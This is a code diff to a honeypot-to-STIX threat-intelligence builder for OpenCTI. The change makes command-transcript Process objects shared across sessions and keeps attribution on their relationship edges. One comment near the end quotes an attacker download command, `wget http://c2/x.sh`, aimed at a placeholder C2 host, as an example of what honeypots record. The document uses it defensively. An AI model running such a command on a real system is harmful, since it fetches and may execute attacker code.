@@ -1421,15 +1421,21 @@ class STIXBuilder:
     def build_process(self, session: AttackSession, commands: list[str]) -> Optional[dict]:
         """Process SDO carrying the attacker's command transcript.
 
-        Enriched per the same pattern as build_ipv4 / build_url / etc.
-        (port of PoC's observable enrichment): x_opencti_description
-        names the attacker + sensor + parser context, x_opencti_labels
-        carries the parser-source tags, x_opencti_created_at is the
-        actual session timestamp so OpenCTI's "Original Creation Date"
-        column reflects when the attack ran (not when the connector
-        ingested it). Per the live cycle 16 review — a bare Process
-        with just command_line and TLP marking is hard to use; the
-        analyst can't tell which sensor/parser the commands came from.
+        CONTENT-ADDRESSED and therefore SHARED: one object per distinct
+        transcript, not per session. That inverts the enrichment rule this
+        method used to follow. The old docstring described naming the attacker
+        and sensor in x_opencti_description the way build_ipv4 / build_url do —
+        correct for a per-session object, false the moment two sessions share
+        one. Per-session facts now live on the edges and Notes; only what is
+        true of the transcript itself stays here.
+
+        x_opencti_created_at is kept and is the session timestamp. It is NOT
+        attribution: it is "first time this transcript was seen", and because
+        cycles run forward in time the first writer is the earliest observation.
+
+        Returns None in TWO distinguishable cases — recon-only drop, and
+        already-emitted-this-bundle. Callers must not conflate them; use
+        _emit_process, which does the distinguishing.
         """
         if not commands:
             return None
@@ -1474,20 +1480,33 @@ class STIXBuilder:
             # every attacker who ran this transcript, so "executed by attacker
             # 1.2.3.4 on sensor foo" would be true only for whichever session
             # happened to write it first and false for all the rest -- the
-            # pipeline asserting what it has not established. Who ran it, from
-            # where, and when lives on the Process -> IPv4 relationship (which
-            # carries start_time/stop_time) and on the session Notes.
+            # pipeline asserting what it has not established. Who ran it and
+            # from where lives on the Process -> IPv4 relationship and on the
+            # session Notes.
             #
             # The sensor: label is dropped for the same reason: one transcript
             # seen on three sensors would otherwise be tagged with one of them.
+            # event_type is out of the DESCRIPTION too -- one transcript seen
+            # via two parsers would otherwise rewrite the description on every
+            # cycle, churning the object. The parser LABELS stay, because
+            # OpenCTI accumulates labels as a set rather than replacing them.
             "x_opencti_description": (
-                f"Command sequence observed in {session.event_type} honeypot "
-                f"sessions ({len(commands)} command(s)). Attribution is on the "
-                f"relationships to the source addresses, not on this object."
+                f"Command sequence observed in honeypot sessions "
+                f"({len(commands)} command(s)). Which attacker ran it, from "
+                f"where, on which sensor and when is carried by the "
+                f"relationships to the source addresses and by the session "
+                f"Notes — not by this object, which is shared by every "
+                f"session that ran this transcript."
             ),
             "x_opencti_labels": sorted(set(
                 parser_labels_for(session.event_type) + ["command-transcript"]
             )),
+            # Kept deliberately. This is NOT attribution -- it carries no IP and
+            # no sensor. It means "first time this transcript was seen", and
+            # because cycles run forward in time the first writer is the
+            # earliest observation. Dropping it would lose the only timestamp
+            # on the object with nowhere else to recover it from today.
+            "x_opencti_created_at": session.first_seen.isoformat(),
         }
         return self._dedup(self._stamp(obj))
 
@@ -2111,6 +2130,38 @@ class STIXBuilder:
     # (main.run_cycle) dispatches to the right method via _PARSER_DISPATCH.
     # ──────────────────────────────────────────────────────────────────
 
+    def _emit_process(
+        self, session: AttackSession, out: list[dict],
+    ) -> Optional[str]:
+        """Append the Process if it is new to this bundle, and return the id to
+        anchor its edges on -- or None if there is no Process to anchor.
+
+        These are DIFFERENT questions, and conflating them is a live bug that
+        content-addressing created. build_process returns None for two reasons:
+        the session was recon-only and dropped, OR _dedup already emitted this
+        object in this bundle. Under the old session-scoped ids the second case
+        was nearly unreachable -- every session had its own id. Now that
+        identical transcripts share an id, it is the COMMON case: the second
+        and every later session running a known transcript got None, so
+        `if proc:` was false and both its Process -> IPv4 and Process -> File
+        edges were silently dropped.
+
+        That would have deleted exactly the attribution this change moves onto
+        the relationships, for exactly the sessions that share a transcript.
+        _emitted_ids tells the two None cases apart -- the same distinction
+        build_url's callers already have to make.
+        """
+        if not session.commands:
+            return None
+        proc = self.build_process(session, session.commands)
+        if proc:
+            out.append(proc)
+            return proc["id"]
+        pid = generate_process_id(session.commands)
+        # Already in this bundle -> the node exists, anchor on it.
+        # Not in this bundle -> build_process dropped it, do not anchor.
+        return pid if pid in self._emitted_ids else None
+
     def _link_download_chain(
         self, session: AttackSession, *, process_id: Optional[str],
     ) -> list[dict]:
@@ -2294,17 +2345,13 @@ class STIXBuilder:
                     out.append(rel)
 
         # Process (commands)
-        process_id: Optional[str] = None
-        if session.commands:
-            proc = self.build_process(session, session.commands)
-            if proc:
-                out.append(proc)
-                process_id = proc["id"]
-                if rel := self.build_relationship(
-                    proc["id"], "related-to", ipv4_id,
-                    description=f"Commands run by {session.src_ip} in Cowrie session",
-                ):
-                    out.append(rel)
+        process_id = self._emit_process(session, out)
+        if process_id:
+            if rel := self.build_relationship(
+                process_id, "related-to", ipv4_id,
+                description=f"Commands run by {session.src_ip} in Cowrie session",
+            ):
+                out.append(rel)
 
         # File downloads → StixFile + Indicator + URL/Domain
         for sha256 in session.malware_hashes:
@@ -3206,17 +3253,13 @@ class STIXBuilder:
             return out
         ipv4_id = attacker_ip_observable_id(session.src_ip)
 
-        chain_process_id: Optional[str] = None
-        if session.commands:
-            proc = self.build_process(session, session.commands)
-            if proc:
-                out.append(proc)
-                chain_process_id = proc["id"]
-                if rel := self.build_relationship(
-                    proc["id"], "related-to", ipv4_id,
-                    description=f"Commands executed by {session.src_ip}",
-                ):
-                    out.append(rel)
+        chain_process_id = self._emit_process(session, out)
+        if chain_process_id:
+            if rel := self.build_relationship(
+                chain_process_id, "related-to", ipv4_id,
+                description=f"Commands executed by {session.src_ip}",
+            ):
+                out.append(rel)
 
 
         for sha256 in session.malware_hashes:
@@ -3350,15 +3393,13 @@ class STIXBuilder:
                     description=f"{session.event_type} activity from {session.src_ip}",
                 )):
                     out.append(rel)
-        if session.commands:
-            proc = self.build_process(session, session.commands)
-            if proc:
-                out.append(proc)
-                if rel := self.build_relationship(
-                    proc["id"], "related-to", ipv4_id,
-                    description=f"Commands from {session.src_ip}",
-                ):
-                    out.append(rel)
+        _pid = self._emit_process(session, out)
+        if _pid:
+            if rel := self.build_relationship(
+                _pid, "related-to", ipv4_id,
+                description=f"Commands from {session.src_ip}",
+            ):
+                out.append(rel)
         # Payload/dropper URLs in the command transcript: SSH & protocol
         # honeypots log `wget http://c2/x.sh` but never run it, so the
         # payload URL + C2 host are IOCs we would otherwise lose. (Cowrie
